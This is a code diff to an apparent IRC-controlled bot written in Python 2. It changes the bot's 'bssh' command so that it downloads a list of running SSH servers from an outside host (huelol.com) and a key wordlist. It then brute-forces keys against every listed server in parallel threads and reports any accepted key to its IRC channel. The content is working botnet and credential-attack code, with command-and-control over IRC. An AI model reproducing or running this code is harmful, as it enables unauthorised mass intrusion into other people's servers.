@@ -203,10 +203,10 @@ class Bot:
 		if (cmd == 'bssh'):
 			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 2, place):
+			if not self.check_args(args, 1, place):
 				return
 
-			t = Thread(target=self.bssh, args=(args[0], args[1], place,))
+			t = Thread(target=self.bssh, args=(args[0], place,))
 			self.add_jobs('bssh', [t])
 			t.start()
 			self.printayne('bruteforcing ssh {0}'.format(args[0]), [place])
@@ -299,23 +299,37 @@ class Bot:
 		except Exception, e:
 			return False
 
-	def bssh(self, target, url, place):
+	def bssh_r(self, target, keys, place):
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		for k in keys:
+			if not self.job_running('bssh'):
+				return
+			if self.bssh_u(ssh, target, k.strip('\r\n')):
+				self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, k), [place])
+		self.pop_job('bssh')
+
+	def bssh(self, url, place):
 		try:
+			web_file = urllib2.urlopen('http://www.huelol.com/ssh/all')
+			sshs = web_file.readlines()
 			web_file = urllib2.urlopen(url)
-			ssh = paramiko.SSHClient()
-			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-			for p in web_file.readlines():
-				print p
-				if not self.job_running('bssh'):
-					return
-				if self.bssh_u(ssh, target, p.strip('\r\n')):
-					self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, p), [place])
-				else:
-					self.printayne('ssh {0} KEY {1} failed'.format(target, p), [place])
-			self.pop_job('bssh')
+			keys = web_file.readlines()
+			self.printayne('collected {0} running SSHs # wordlist contains {1} keys'.format(len(sshs), len(keys)), [place])
+			for ssh in sshs:
+				self.printayne('bssh now bruting {0}'.format(ssh), [place])
+				ts = []
+				for i in range(4):
+					t = Thread(target=self.bssh_r, args=(ssh.strip('\r\n'), keys[i*5:i*5+5], place,))
+					self.add_jobs('bssh', [t])
+					t.start()
+					ts.append(t)
+				for t in ts:
+					t.join()
 		except Exception, e:
 			self.printayne(e, [place])
-			self.printayne('error downloading wordlist file', [place])
+			self.printayne('error downloading ssh list file', [place])
+
 
 	def work(self):
 		while True:
@@ -330,7 +344,7 @@ class Bot:
 					self.parse(clean)
 
 if __name__ == '__main__':
-	bot = Bot('vayneluwl')
+	bot = Bot('PIKACHU')
 	#bot.add_connection('google.root-network.org', 6667)
 	bot.add_connection(sys.argv[1], 6667)
 	channels = ['#{0}'.format(x) for x in sys.argv[2:]]
